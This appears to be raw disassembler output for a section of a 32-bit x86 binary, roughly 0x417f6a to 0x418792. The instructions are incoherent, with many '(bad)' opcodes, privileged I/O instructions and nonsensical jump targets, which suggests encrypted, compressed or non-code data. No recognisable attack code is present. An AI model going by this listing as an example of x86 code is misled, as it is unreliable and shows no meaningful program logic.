  417f6a:	icebp  
  417f6b:	sub    esi,DWORD PTR [esi+ecx*4-0x20]
  417f6f:	xor    al,0x8f
  417f71:	push   ecx
  417f72:	mov    al,0x3c
  417f74:	outs   dx,BYTE PTR ds:[esi]
  417f75:	and    al,0x2c
  417f77:	or     ah,BYTE PTR [edx+0x30]
  417f7a:	xchg   esi,eax
  417f7b:	(bad)  
  417f7c:	mov    ds:0x1fe99790,al
  417f81:	cmc    
  417f82:	das    
  417f83:	mov    bh,0xc8
  417f85:	sub    eax,0x62918c65
  417f8a:	sbb    eax,0x970bca37
  417f8f:	mov    eax,0xc6550abf
  417f94:	sahf   
  417f95:	jnp    0x417f6c
  417f97:	add    bh,bh
  417f99:	data16 rcr BYTE PTR [ebx],1
  417f9c:	sahf   
  417f9d:	dec    BYTE PTR [edi]
  417f9f:	dec    ecx
  417fa0:	loopne 0x417f66
  417fa2:	popa   
  417fa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fa4:	pop    ebx
  417fa6:	int3   
  417fa7:	fs jns 0x417fdd
  417faa:	sbb    eax,ebp
  417fac:	inc    edx
  417fad:	mov    cl,0xd9
  417faf:	pop    esi
  417fb0:	imul   edi,DWORD PTR [ecx-0x77],0x49c77c6a
  417fb7:	ins    DWORD PTR es:[edi],dx
  417fb8:	out    0xd6,al
  417fba:	jmp    0x801744b3
  417fbf:	std    
  417fc0:	test   bl,ch
  417fc2:	xchg   BYTE PTR [ecx-0x29e17c6e],dl
  417fc8:	dec    ecx
  417fc9:	mov    eax,ds:0x3e29ced4
  417fce:	push   edx
  417fcf:	js     0x417fc7
  417fd1:	stc    
  417fd2:	mov    al,al
  417fd4:	xchg   edi,eax
  417fd5:	(bad)  
  417fd6:	cli    
  417fd7:	jns    0x417f74
  417fd9:	inc    esi
  417fda:	(bad)
  417fde:	clc    
  417fdf:	scas   al,BYTE PTR es:[edi]
  417fe0:	jmp    0x418032
  417fe2:	mov    al,0x25
  417fe4:	mov    bh,0x50
  417fe6:	inc    ebp
  417fe7:	sbb    edi,esp
  417fe9:	cld    
  417fea:	xor    dl,cl
  417fec:	out    dx,al
  417fed:	into   
  417fee:	jmp    0x417fc6
  417ff0:	call   0x39721e05
  417ff5:	cld    
  417ff6:	js     0x417fa8
  417ff8:	xlat   BYTE PTR ds:[ebx]
  417ff9:	push   0xffffffe2
  417ffb:	imul   esi,edx,0xd154edfd
  418001:	inc    edx
  418002:	sbb    BYTE PTR [ebx],bl
  418004:	mov    WORD PTR [eax+0x518cfee1],fs
  41800a:	push   edi
  41800b:	mov    ebp,0xf9f08da4
  418010:	and    BYTE PTR [ebx-0x4b671208],bl
  418016:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418017:	jmp    0x418009
  418019:	enter  0x8d82,0xe2
  41801d:	sbb    DWORD PTR [edi+ebx*2],esp
  418020:	je     0x418059
  418022:	adc    al,0x8a
  418024:	pop    eax
  418025:	out    dx,al
  418026:	cmp    edx,DWORD PTR ds:0x943092f
  41802c:	xchg   esi,eax
  41802d:	arpl   WORD PTR [eax-0x26991ff5],ax
  418033:	mov    al,0x2f
  418035:	rol    BYTE PTR [edx-0x114daa44],0x5c
  41803c:	adc    edx,eax
  41803e:	ror    ebp,1
  418040:	out    dx,al
  418041:	sbb    DWORD PTR [esi-0x69],edi
  418044:	fcmovbe st,st(5)
  418046:	dec    esi
  418047:	inc    ebp
  418048:	jg     0x418063
  41804a:	xor    BYTE PTR fs:0x675de1e8,cl
  418051:	mov    edi,0x60301d2d
  418056:	xchg   ebx,eax
  418057:	sbb    dl,BYTE PTR [ebx+edx*4+0x54ce4f74]
  41805e:	push   ecx
  41805f:	mov    eax,ds:0xee97a137
  418064:	xor    DWORD PTR [esp+ebx*4+0x227ea4c6],esi
  41806b:	(bad)  
  41806c:	adc    BYTE PTR [edx],bl
  41806e:	sbb    DWORD PTR [edx],eax
  418070:	pop    ss
  418071:	aaa    
  418072:	jecxz  0x4180c2
  418074:	cmp    eax,0xa6bda260
  418079:	clc    
  41807a:	out    dx,eax
  41807b:	ret    
  41807c:	adc    ah,BYTE PTR [edx+0x38fa1d4]
  418082:	xlat   BYTE PTR ds:[ebx]
  418083:	mov    ebp,0xc055963a
  418088:	push   0x7b093745
  41808d:	mov    ebp,0x6c15796e
  418092:	or     BYTE PTR [ecx+0x70],dh
  418095:	dec    esi
  418096:	or     esi,ebp
  418098:	gs mov dh,0xc4
  41809b:	pushf  
  41809c:	mov    ch,0x90
  41809e:	cmp    edx,esi
  4180a0:	xchg   ebp,eax
  4180a1:	push   edx
  4180a2:	mov    esp,0xf6f6da5f
  4180a7:	dec    edx
  4180a8:	dec    ebp
  4180a9:	mov    dl,0xce
  4180ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180ac:	dec    ecx
  4180ad:	scas   eax,DWORD PTR es:[edi]
  4180ae:	add    ah,BYTE PTR [eax]
  4180b0:	sub    edi,DWORD PTR [esi+eax*4]
  4180b3:	xchg   esi,eax
  4180b4:	retf   0x92eb
  4180b7:	aad    0x76
  4180b9:	jne    0x418071
  4180bb:	adc    eax,0x39ca65f3
  4180c0:	lods   eax,DWORD PTR ds:[esi]
  4180c1:	jge    0x418108
  4180c3:	(bad)  [eax]
  4180c5:	xor    bh,al
  4180c7:	mov    dl,0xaa
  4180c9:	mov    ebx,0x768c16ac
  4180ce:	sti    
  4180cf:	jp     0x41811c
  4180d1:	rcl    BYTE PTR ds:0x513097b,cl
  4180d7:	and    eax,0xc2348715
  4180dc:	cdq    
  4180dd:	arpl   WORD PTR [ebx],cx
  4180df:	cmovb  esp,ecx
  4180e2:	cmp    al,BYTE PTR [ebp+0x2066e1a5]
  4180e8:	aas    
  4180e9:	int3   
  4180ea:	fs xor edx,0xcb4134e8
  4180f1:	cld    
  4180f2:	mov    ch,0x95
  4180f4:	mov    cl,BYTE PTR ds:0xe366c546
  4180fa:	jno    0x418171
  4180fc:	dec    eax
  4180fd:	sbb    al,0x67
  4180ff:	inc    esi
  418100:	sbb    ch,BYTE PTR [ecx-0x16ff1483]
  418106:	dec    ebp
  418107:	(bad)  
  418108:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418109:	dec    esi
  41810a:	fadd   QWORD PTR [ebp+0x6d3601a9]
  418110:	or     eax,0xfb826a87
  418115:	dec    esp
  418116:	pushf  
  418117:	ins    DWORD PTR es:[edi],dx
  418118:	cmp    DWORD PTR [edx-0x65e5bcff],0x8ab5d146
  418122:	pop    eax
  418123:	das    
  418124:	and    bh,ah
  418126:	scas   al,BYTE PTR es:[edi]
  418127:	test   al,0x2c
  418129:	mov    eax,0xb6e136c2
  41812e:	inc    DWORD PTR [ecx-0x77]
  418131:	sub    DWORD PTR [ebx-0x4c86953c],esp
  418137:	add    eax,0x8f949214
  41813c:	xchg   BYTE PTR [edx-0x492ab1f7],cl
  418142:	xor    eax,0xa548d4ef
  418147:	jg     0x41812d
  418149:	sti    
  41814a:	dec    ebp
  41814b:	aad    0x16
  41814d:	test   WORD PTR [edx],0xf748
  418152:	add    ebp,DWORD PTR [ecx-0x34]
  418155:	fdiv   QWORD PTR [edx+0x6f]
  418158:	idiv   DWORD PTR [edi+0x793cf8e3]
  41815e:	(bad)  
  41815f:	aad    0x7c
  418161:	rcl    BYTE PTR [esi+0x11],1
  418164:	int3   
  418165:	and    al,0x55
  418167:	call   0xcba71a3b
  41816c:	or     bh,BYTE PTR [edi]
  41816e:	fs push ecx
  418170:	and    ecx,eax
  418172:	and    DWORD PTR [esi+0x2066a8a3],0x21
  418179:	jne    0x418151
  41817b:	push   ecx
  41817c:	jae    0x418188
  41817e:	div    BYTE PTR [edx+eax*2]
  418181:	add    cl,BYTE PTR [edi]
  418183:	enter  0xdfd,0x6
  418187:	arpl   WORD PTR [ebx+0x7af2263a],cx
  41818d:	mov    eax,0xb137395e
  418192:	sub    al,BYTE PTR [esi-0x702e1039]
  418198:	push   0xd
  41819a:	inc    esi
  41819b:	pop    eax
  41819c:	and    DWORD PTR [ebp+0x78],0xffffffaf
  4181a0:	jb     0x4181ed
  4181a2:	dec    esp
  4181a3:	push   eax
  4181a4:	retf   
  4181a5:	rol    esp,1
  4181a7:	or     eax,0xfaa1e7a5
  4181ac:	mov    WORD PTR [ebx],ds
  4181ae:	int    0xa9
  4181b0:	je     0x4181fb
  4181b2:	mov    esi,0xe51e70ea
  4181b7:	or     edi,DWORD PTR [esi]
  4181b9:	loop   0x4181db
  4181bb:	jbe    0x41821f
  4181bd:	pop    eax
  4181be:	xor    ah,BYTE PTR [edi+0x4558913]
  4181c4:	mov    WORD PTR [edx-0x4a],ds
  4181c7:	jecxz  0x418190
  4181c9:	sbb    eax,0x51a1ae77
  4181ce:	stos   BYTE PTR es:[edi],al
  4181cf:	test   eax,0xc9bf740a
  4181d4:	or     DWORD PTR ds:0x76ab3069,edx
  4181da:	inc    eax
  4181db:	sub    BYTE PTR gs:[esi-0x29],ah
  4181df:	bnd jo 0x418237
  4181e2:	cmp    DWORD PTR [ecx-0x384f3897],edi
  4181e8:	aad    0xc
  4181ea:	sti    
  4181eb:	outs   dx,DWORD PTR ds:[esi]
  4181ec:	prefetch BYTE PTR [ecx-0x3c0acccd]
  4181f3:	xor    dl,cl
  4181f5:	outs   dx,DWORD PTR ds:[esi]
  4181f6:	mov    cl,0xe9
  4181f8:	sti    
  4181f9:	div    edx
  4181fb:	pop    es
  4181fc:	fidiv  WORD PTR [edi+0x487ad586]
  418202:	scas   al,BYTE PTR es:[edi]
  418203:	popa   
  418204:	sbb    eax,DWORD PTR [ebx-0x7751e94d]
  41820a:	sub    DWORD PTR [edx-0xb1143ea],eax
  418210:	loope  0x418251
  418212:	pop    ds
  418213:	add    al,0x55
  418215:	mov    es,WORD PTR [ecx+0x1b9d1082]
  41821b:	jae    0x4181b2
  41821d:	imul   edi,DWORD PTR [eax],0x2a
  418220:	stos   DWORD PTR es:[edi],eax
  418221:	or     al,0x95
  418223:	xlat   BYTE PTR ds:[ebx]
  418225:	test   DWORD PTR [edx+eax*2],eax
  418228:	mov    al,ds:0x6bcb3e49
  41822d:	ss inc ebp
  41822f:	cmp    esi,DWORD PTR [ecx+0x19]
  418232:	mov    esi,0x9d23ecde
  418237:	sub    eax,0xfba33316
  41823c:	jmp    0x41825b
  41823e:	mov    al,0x95
  418240:	adc    eax,0x22fce68f
  418245:	cmp    DWORD PTR [eax+0x13],0x1eec32a2
  41824c:	adc    al,0xe8
  41824e:	push   ebx
  41824f:	pop    ds
  418250:	sar    BYTE PTR [edi+0x45],cl
  418253:	js     0x418227
  418255:	dec    ecx
  418256:	loop   0x418293
  418258:	or     edi,0x4a0f8aa3
  41825e:	lock and al,0x6e
  418261:	cmp    ecx,DWORD PTR [ecx]
  418263:	push   0x7882a975
  418268:	add    eax,DWORD PTR [edi]
  41826a:	into   
  41826b:	mov    ecx,0x6da3ac49
  418270:	mov    dl,0x66
  418272:	adc    BYTE PTR [edx-0x3c444150],bh
  418278:	lds    eax,FWORD PTR [edi-0x2429606e]
  41827e:	das    
  41827f:	dec    eax
  418280:	les    ebp,FWORD PTR [ebp+0x31]
  418283:	mov    ds:0x151ed8,eax
  418288:	inc    esp
  418289:	cmp    DWORD PTR [edx+eiz*1],eax
  41828c:	sub    eax,0x25875012
  418291:	bnd jno 0x4182b5
  418294:	sbb    eax,0x473307a6
  418299:	aam    0x10
  41829b:	mov    cs,WORD PTR [esp+eax*1-0x40]
  41829f:	xor    ecx,DWORD PTR fs:[esi]
  4182a2:	cld    
  4182a3:	mov    DWORD PTR [edi+ebp*1+0x1d],ebx
  4182a7:	sbb    DWORD PTR [esp+eiz*8+0x1751f7d1],0x299d8676
  4182b2:	dec    esp
  4182b3:	cmp    al,0x17
  4182b5:	int3   
  4182b6:	in     eax,dx
  4182b7:	pusha  
  4182b8:	dec    edx
  4182b9:	(bad)  
  4182ba:	test   eax,0x8b82df3a
  4182bf:	sahf   
  4182c0:	xor    DWORD PTR [edi+0x74],eax
  4182c3:	call   0x608bc250
  4182c8:	test   al,0xce
  4182ca:	push   ss
  4182cb:	push   eax
  4182cc:	mov    DWORD PTR [ebx-0x6f745016],0xb4ffc546
  4182d6:	pop    edx
  4182d7:	pminub mm4,QWORD PTR [edx+0x76]
  4182db:	(bad)  
  4182dc:	mul    DWORD PTR [edi+ecx*1]
  4182df:	inc    DWORD PTR [edi]
  4182e1:	mov    ebx,0x55e6f0b8
  4182e6:	add    al,BYTE PTR [edx]
  4182e8:	jmp    0x70d21dea
  4182ed:	mov    esp,0xe7cbb53d
  4182f2:	xchg   ecx,eax
  4182f3:	stc    
  4182f4:	jb     0x4182af
  4182f6:	add    al,0xbd
  4182f8:	mov    edx,0x7d2d332d
  4182fd:	out    dx,al
  4182fe:	push   esp
  4182ff:	xchg   ecx,eax
  418300:	dec    edx
  418301:	jge    0x418294
  418303:	pop    esi
  418304:	inc    esi
  418305:	into   
  418306:	add    DWORD PTR [ebx-0x77],eax
  418309:	imul   ebp,edi,0xc398bf81
  41830f:	lds    edi,FWORD PTR [ecx+0x5d]
  418312:	js     0x418393
  418314:	rcl    BYTE PTR [ecx-0x490fe230],1
  41831a:	and    al,0x93
  41831c:	sub    bh,bh
  41831e:	xchg   edx,eax
  41831f:	adc    dl,0xd2
  418322:	das    
  418323:	cvttps2pi mm2,QWORD PTR [ebp+eiz*1-0x3d]
  418328:	dec    edi
  418329:	les    esp,FWORD PTR [ebx*4+0x3b05bfe5]
  418330:	cli    
  418331:	jmp    0x8575:0x5b73154e
  418338:	fld    QWORD PTR [eax+ebp*8]
  41833b:	faddp  st(0),st
  41833d:	out    dx,al
  41833e:	xor    al,0x41
  418340:	cmp    edx,DWORD PTR [ebx+0x4a]
  418343:	shl    DWORD PTR [ebp-0x53],1
  418346:	xor    DWORD PTR [ebp+0x4bf6bfbc],ebp
  41834c:	repz repz pop es
  41834f:	icebp  
  418350:	xchg   esi,eax
  418351:	adc    BYTE PTR [eax+ecx*1+0x3b],0xb0
  418356:	enter  0x27f5,0x45
  41835a:	jne    0x418340
  41835c:	cmp    eax,0xe8d96e9c
  418361:	push   0xffffff99
  418363:	jle    0x4183cd
  418365:	mov    esp,0xbcb5c3b7
  41836a:	jecxz  0x4183c7
  41836c:	call   0x30e2:0x68c3
  418372:	xchg   ebp,eax
  418373:	(bad)  [edi+esi*4+0x0]
  418377:	xor    al,0x98
  418379:	les    esi,FWORD PTR [ebp-0x472dc629]
  41837f:	add    ch,ch
  418381:	ror    DWORD PTR [eax],1
  418383:	call   0xde8b:0xd1dea181
  41838a:	jge    0x418319
  41838c:	jl     0x41837e
  41838e:	nop    edx
  418391:	add    al,0xa1
  418393:	xchg   ecx,eax
  418394:	inc    ecx
  418395:	scas   eax,DWORD PTR es:[edi]
  418396:	js     0x41840b
  418398:	sbb    BYTE PTR [edx+0x65],dl
  41839b:	inc    eax
  41839c:	fnstsw WORD PTR [esp+ecx*2]
  41839f:	mov    cl,0xda
  4183a1:	lods   eax,DWORD PTR ds:[esi]
  4183a2:	xchg   DWORD PTR [ebp+eiz*1+0x1979996b],edx
  4183a9:	sub    DWORD PTR [ebp*1-0x50c5a07],ebp
  4183b0:	aad    0x6c
  4183b2:	inc    ecx
  4183b3:	ds cmovl edi,eax
  4183b7:	pop    ebx
  4183b8:	ss aas 
  4183ba:	pop    ebx
  4183bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183bc:	adc    ah,bl
  4183be:	arpl   si,dx
  4183c0:	sti    
  4183c1:	sub    dl,bl
  4183c3:	jae    0x418403
  4183c5:	sbb    ebx,DWORD PTR ds:0x89ee9aa0
  4183cb:	xor    DWORD PTR [edi+eax*1],eax
  4183ce:	cmp    dh,BYTE PTR [edi+0x73]
  4183d1:	xchg   ebx,edi
  4183d3:	sbb    cl,ah
  4183d5:	mov    al,ds:0x49ea5cc
  4183da:	mov    esp,0x560e208
  4183df:	adc    edx,DWORD PTR [edi-0xac33b60]
  4183e5:	test   al,0x60
  4183e7:	xor    eax,0x3394551b
  4183ec:	mov    edx,0x531e37
  4183f1:	sahf   
  4183f2:	out    dx,al
  4183f3:	retf   0xfe6c
  4183f6:	dec    ebp
  4183f7:	mov    edx,0xfcd859ef
  4183fc:	imul   eax,eax,0x27
  4183ff:	push   ss
  418400:	test   al,0xdf
  418402:	jl     0x41847d
  418404:	cmp    ecx,esi
  418406:	dec    ecx
  418407:	adc    DWORD PTR [ecx],eax
  418409:	push   eax
  41840a:	mov    ecx,0xfa8da75b
  41840f:	cmp    al,0xc3
  418411:	and    BYTE PTR [ecx],bh
  418413:	xchg   edi,eax
  418414:	es leave 
  418416:	outs   dx,BYTE PTR ds:[esi]
  418417:	jno    0x418441
  418419:	inc    ecx
  41841a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41841b:	(bad)  
  41841c:	les    eax,FWORD PTR [ebx-0x2d]
  41841f:	adc    BYTE PTR [ebx],bl
  418421:	push   edx
  418422:	sbb    dl,ch
  418424:	inc    edi
  418425:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418426:	jb     0x4183c7
  418428:	push   0xb1ac1370
  41842d:	cmp    al,0xfe
  41842f:	mov    bh,0xd2
  418431:	mov    ds:0x57ebf2b2,eax
  418436:	fcomp  DWORD PTR [edi+0x61]
  418439:	mov    al,ds:0x28960de
  41843e:	xchg   BYTE PTR [edx-0x38],ch
  418441:	xor    DWORD PTR [ebp-0x70eaa1b5],esp
  418447:	les    edi,FWORD PTR [eax]
  418449:	enter  0xc845,0xf4
  41844d:	push   cs
  41844e:	repz icebp 
  418450:	push   ecx
  418451:	inc    ebp
  418452:	and    eax,0x1cc06fbc
  418457:	push   esi
  418458:	add    BYTE PTR [ecx],cl
  41845a:	xchg   bx,ax
  41845c:	inc    edi
  41845d:	lock pop esp
  41845f:	loopne 0x4184dd
  418461:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418462:	sbb    al,0xc5
  418464:	inc    esi
  418465:	xor    esp,eax
  418467:	dec    eax
  418468:	xchg   edi,eax
  418469:	sti    
  41846a:	icebp  
  41846b:	and    DWORD PTR [ebx+0x3f],edx
  41846e:	out    dx,al
  41846f:	inc    ebx
  418470:	or     esi,0xffffffb1
  418473:	loope  0x4184cd
  418475:	pop    ecx
  418476:	cmp    al,0x54
  418478:	or     ah,0x62
  41847b:	ret    0x47db
  41847e:	mov    WORD PTR [edi+0x34f8ad97],es
  418484:	lea    edx,[ebx-0x631c47a3]
  41848a:	add    dl,BYTE PTR [eax+0xa]
  41848d:	push   0x10
  41848f:	and    al,0xa7
  418491:	rol    dh,1
  418493:	shl    bl,1
  418495:	add    cl,BYTE PTR [edi+0x3a]
  418498:	dec    ecx
  418499:	popa   
  41849a:	and    dh,0x2c
  41849d:	cdq    
  41849e:	mov    ah,0xcc
  4184a0:	mov    bl,0xbd
  4184a2:	jae    0x41847d
  4184a4:	mov    esp,0x9141a17b
  4184a9:	pop    esp
  4184aa:	push   ebp
  4184ab:	data16 data16 addr16 lahf 
  4184af:	xchg   BYTE PTR [esp+ebx*4],dh
  4184b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184b3:	je     0x4184b3
  4184b5:	jle    0x418533
  4184b7:	push   ss
  4184b8:	scas   al,BYTE PTR es:[edi]
  4184b9:	fadd   st,st(7)
  4184bb:	sahf   
  4184bc:	jecxz  0x4184f2
  4184be:	sbb    eax,0x3e9fb18e
  4184c3:	(bad)  
  4184c4:	adc    eax,eax
  4184c6:	mov    ebp,0x742a43c0
  4184cb:	call   0xdbc6737b
  4184d0:	mov    dl,0x2c
  4184d2:	or     al,0x81
  4184d4:	idiv   BYTE PTR [ecx]
  4184d6:	repz mov ecx,DWORD PTR [edi-0x6ab0903f]
  4184dd:	test   DWORD PTR [ebx-0x47],0x65198831
  4184e4:	adc    BYTE PTR [esi-0x57fe5142],dl
  4184ea:	inc    ecx
  4184eb:	add    DWORD PTR [eax+0x13e7ed8a],esp
  4184f1:	sub    al,0xc4
  4184f3:	dec    esp
  4184f4:	sbb    dl,bh
  4184f6:	nop
  4184f7:	dec    edx
  4184f8:	clc    
  4184f9:	outs   dx,BYTE PTR ds:[esi]
  4184fa:	pop    ss
  4184fb:	or     al,0x5c
  4184fd:	lock or eax,0x1cf3a1a6
  418503:	mov    esi,DWORD PTR [ebx+ecx*4]
  418506:	mov    al,ds:0x1ab0bc16
  41850b:	aas    
  41850c:	or     DWORD PTR [eax+0x75d4555d],edx
  418512:	and    edx,DWORD PTR [ecx]
  418514:	out    0x79,eax
  418516:	(bad)  
  418517:	fstp   TBYTE PTR [esi-0x5ebe5464]
  41851d:	pop    eax
  41851e:	out    dx,al
  41851f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418520:	mov    esi,cs
  418522:	fidivr WORD PTR [eax+0xd]
  418525:	push   ecx
  418526:	je     0x4184dd
  418528:	push   es
  418529:	push   esp
  41852a:	nop
  41852b:	xor    cl,BYTE PTR [eax+0x568fb502]
  418531:	call   0x77ee26f
  418536:	in     al,dx
  418537:	mov    dl,0xbf
  418539:	dec    esp
  41853a:	(bad)  
  41853b:	iret   
  41853c:	dec    ecx
  41853d:	js     0x4184f7
  41853f:	test   eax,0xfadbd250
  418545:	jne    0x41858e
  418547:	xchg   ebx,eax
  418548:	jp     0x418564
  41854a:	push   ss
  41854b:	xor    DWORD PTR [eax-0x63],ebp
  41854e:	mov    ds:0x3f4e7579,eax
  418553:	mov    edi,0xb9abc203
  418558:	push   esi
  418559:	mov    cl,0x55
  41855b:	add    BYTE PTR [ebx+0x58],bh
  41855e:	fcom   DWORD PTR [eax+ecx*2-0x7a]
  418562:	cmp    esi,DWORD PTR [ebp-0x4f03cb51]
  418568:	inc    eax
  418569:	add    al,0x76
  41856b:	fsub   QWORD PTR [esi-0x240d4231]
  418571:	push   edi
  418572:	xlat   BYTE PTR ds:[ebx]
  418573:	fcom   DWORD PTR [edx+0x16c4646d]
  418579:	jb     0x4185f3
  41857b:	push   0x58
  41857d:	lea    esi,[ebp-0x2c]
  418580:	mov    al,ds:0xdd09eb1c
  418585:	imul   edi,DWORD PTR [ecx],0xffffff91
  418588:	hlt    
  418589:	jnp    0x418572
  41858b:	mov    dh,BYTE PTR [ebp+esi*2-0x2405939d]
  418592:	(bad)  
  418593:	out    0xb1,al
  418595:	call   0xc7a9:0x4b7e0cf2
  41859c:	dec    ecx
  41859d:	aam    0xdc
  41859f:	ss cmp edi,ebp
  4185a2:	add    BYTE PTR ds:0x4572d1a0,bl
  4185a8:	(bad)  
  4185a9:	pop    ecx
  4185aa:	xchg   BYTE PTR [eax+ebx*4-0x21b0ec02],dl
  4185b1:	retf   
  4185b2:	and    al,0x35
  4185b4:	pop    ecx
  4185b5:	xor    BYTE PTR [esi],dh
  4185b7:	jbe    0x418619
  4185b9:	sbb    eax,0x8361288e
  4185be:	arpl   WORD PTR [esi],di
  4185c0:	mov    ds:0xa9b94663,al
  4185c5:	aas    
  4185c6:	ror    DWORD PTR [ebx-0x182bc822],0xd7
  4185cd:	add    eax,0x9a170939
  4185d2:	or     ecx,DWORD PTR [ecx-0x733dd096]
  4185d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185d9:	push   esp
  4185da:	lock nop
  4185dc:	mov    esp,0x9837d020
  4185e1:	dec    eax
  4185e2:	push   eax
  4185e3:	not    BYTE PTR [edx*1-0x6de35c6d]
  4185ea:	lds    eax,FWORD PTR [edi+0x77]
  4185ed:	cmovle esi,esp
  4185f0:	in     eax,0xc7
  4185f2:	test   BYTE PTR [edi+0x3b],dl
  4185f5:	add    BYTE PTR [ebx],dh
  4185f7:	or     eax,DWORD PTR [ecx]
  4185f9:	(bad)  
  4185fa:	xchg   edx,eax
  4185fb:	in     eax,dx
  4185fc:	pop    esp
  4185fd:	outs   dx,DWORD PTR ds:[esi]
  4185fe:	mov    bh,0x1f
  418600:	aas    
  418601:	sub    BYTE PTR [ecx],bh
  418603:	pop    ebx
  418604:	test   eax,edi
  418606:	push   ss
  418607:	mov    ah,0x3
  418609:	je     0x41859c
  41860b:	sbb    dh,BYTE PTR [ebx]
  41860d:	pop    ecx
  41860e:	mov    bl,0x29
  418610:	scas   al,BYTE PTR es:[edi]
  418611:	pop    DWORD PTR [esi]
  418613:	and    DWORD PTR [ecx+0x7fc180fe],ecx
  418619:	mov    ch,0x4b
  41861b:	and    DWORD PTR [ebp-0x22],0x537f7ed3
  418622:	and    BYTE PTR [ebp+eiz*2-0x24395067],ch
  418629:	mov    eax,0xd576c83e
  41862e:	jbe    0x4185ba
  418630:	mov    dl,0x93
  418632:	xor    al,0x84
  418634:	and    eax,0xe2d26b32
  418639:	int    0xd4
  41863b:	push   eax
  41863c:	sbb    esp,0x1b
  41863f:	cmp    BYTE PTR [edi+ebp*2],dh
  418642:	(bad)  
  418643:	scas   al,BYTE PTR es:[edi]
  418644:	sbb    BYTE PTR [ecx+eiz*8-0x24],dl
  418648:	or     BYTE PTR [eax+0x450c9f57],ah
  41864e:	sar    BYTE PTR [ebx+0x8d901b3],cl
  418654:	imul   ecx,DWORD PTR [edi-0x54],0xd
  418658:	repz cmc 
  41865a:	mov    esi,ebp
  41865c:	cdq    
  41865d:	push   esp
  41865e:	dec    edi
  41865f:	icebp  
  418660:	xor    BYTE PTR [edx+eiz*8],0x44
  418664:	inc    edi
  418665:	jns    0x41868c
  418667:	sub    eax,0x63e73d9
  41866c:	(bad)  
  41866d:	sbb    eax,0x60938e72
  418672:	and    eax,0xf7c0b934
  418677:	jb     0x41864c
  418679:	adc    edx,ecx
  41867b:	stos   BYTE PTR es:[edi],al
  41867c:	dec    ebp
  41867d:	das    
  41867e:	std    
  41867f:	in     eax,0xc0
  418681:	xchg   ecx,eax
  418682:	cmp    BYTE PTR [ebp+edi*8-0x639c6927],0x5d
  41868a:	ins    DWORD PTR es:[edi],dx
  41868b:	nop
  41868c:	sub    eax,0x9d95e191
  418691:	rcl    cl,1
  418693:	or     DWORD PTR [eax+0x65],ebp
  418696:	bound  ebx,QWORD PTR [ebx]
  418698:	and    BYTE PTR fs:[edx-0x73427faf],dh
  41869f:	add    al,0xcd
  4186a1:	scas   al,BYTE PTR es:[edi]
  4186a2:	and    DWORD PTR [edi],ebx
  4186a4:	and    DWORD PTR [edi-0x31],eax
  4186a7:	(bad)  
  4186a8:	push   esi
  4186a9:	cs add al,0x74
  4186ac:	sbb    eax,0x72f007e5
  4186b1:	jl     0x418655
  4186b3:	mov    bl,0xb2
  4186b5:	cmp    al,0xe3
  4186b7:	and    eax,0xa1adf633
  4186bc:	ss adc al,0x3a
  4186bf:	mov    bl,0x43
  4186c1:	or     ch,ch
  4186c3:	adc    esi,ecx
  4186c5:	dec    ecx
  4186c6:	out    0x9b,eax
  4186c8:	add    edx,ebx
  4186ca:	jmp    FWORD PTR [ebx]
  4186cc:	push   ecx
  4186cd:	mov    esp,0xad400ede
  4186d2:	outs   dx,BYTE PTR ds:[esi]
  4186d3:	shr    BYTE PTR [edx+0x5c5dc7f7],0x1c
  4186da:	mov    ecx,db6
  4186dd:	or     DWORD PTR [esi+ebx*1+0x18570a7b],edi
  4186e4:	push   ebp
  4186e5:	aam    0xf6
  4186e7:	fcmovbe st,st(3)
  4186e9:	mov    cs,WORD PTR [bx]
  4186ec:	fsubr  DWORD PTR [esi+0x6de8a879]
  4186f2:	xchg   ebp,eax
  4186f3:	jnp    0x41869f
  4186f5:	ins    DWORD PTR es:[edi],dx
  4186f6:	(bad)  
  4186f7:	jmp    0x41874f
  4186f9:	mov    edx,0x2dff4db9
  4186fe:	and    DWORD PTR [edi],ebx
  418700:	pop    ebx
  418701:	xchg   ebp,eax
  418702:	nop
  418703:	adc    al,0x18
  418705:	lock mov ebp,0x491d9e4d
  41870b:	sub    bl,BYTE PTR [edi+0x65]
  41870e:	je     0x41874c
  418710:	out    0x3a,eax
  418712:	loopne 0x41878e
  418714:	inc    edx
  418715:	js     0x4186d0
  418717:	aad    0xbe
  418719:	fwait
  41871a:	or     cl,ch
  41871c:	in     eax,0x65
  41871e:	pop    ebp
  41871f:	inc    eax
  418720:	int3   
  418721:	jecxz  0x41875a
  418723:	lods   eax,DWORD PTR ds:[esi]
  418724:	adc    DWORD PTR [edx],ecx
  418726:	outs   dx,DWORD PTR gs:[esi]
  418728:	push   ebp
  418729:	mov    al,0x85
  41872b:	shr    DWORD PTR [esi],cl
  41872d:	push   esi
  41872e:	cmp    eax,0x3c569865
  418733:	sar    BYTE PTR [ebx+0x68055c02],cl
  418739:	or     DWORD PTR [esi],edx
  41873b:	call   0xf628:0x4a525458
  418742:	in     al,0xf4
  418744:	ins    DWORD PTR es:[edi],dx
  418745:	pop    ecx
  418746:	pushf  
  418747:	int3   
  418748:	popa   
  418749:	adc    bh,0x25
  41874c:	xor    edx,DWORD PTR [ecx-0x2d04872d]
  418752:	les    edi,FWORD PTR [eiz*4-0xcce4eec]
  418759:	(bad)  
  41875a:	or     edi,DWORD PTR [edi+0x5a8bbad5]
  418760:	inc    ecx
  418761:	in     al,0x99
  418763:	sub    al,0xc2
  418765:	push   0xa8ff912f
  41876a:	or     DWORD PTR [eax+edx*8+0x56dac101],edx
  418771:	mov    BYTE PTR [ebx+0x372869b2],dl
  418777:	ror    ecx,0x1a
  41877a:	enter  0x1546,0x7e
  41877e:	or     eax,0x81df06f4
  418783:	push   esi
  418784:	mov    bl,0x3
  418786:	sbb    DWORD PTR [esi-0x8],esp
  418789:	sbb    DWORD PTR [eax],0xffffff81
  41878c:	xchg   edi,eax
  41878d:	test   al,0x7d
  41878f:	adc    DWORD PTR [ebp+0x38],esp
  418792:	xchg   ecx,eax
